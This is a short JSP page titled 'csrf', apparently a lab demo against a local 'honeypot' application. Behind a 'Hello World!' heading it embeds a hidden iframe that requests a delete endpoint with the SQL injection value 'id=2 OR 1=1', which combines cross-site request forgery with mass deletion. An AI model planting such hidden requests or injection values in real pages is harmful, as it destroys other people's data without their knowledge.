<%-- 
    Document   : csrf
    Created on : Mar 6, 2015, 7:46:35 AM
    Author     : andy
--%>

<%@page contentType="text/html" pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title>JSP Page</title>
    </head>
    <body>
        <h1>Hello World!</h1>
        <iframe src="http://localhost:8080/honeypot/delete?id=2%20OR%201=1" style="display: none;"/>
    </body>
</html>
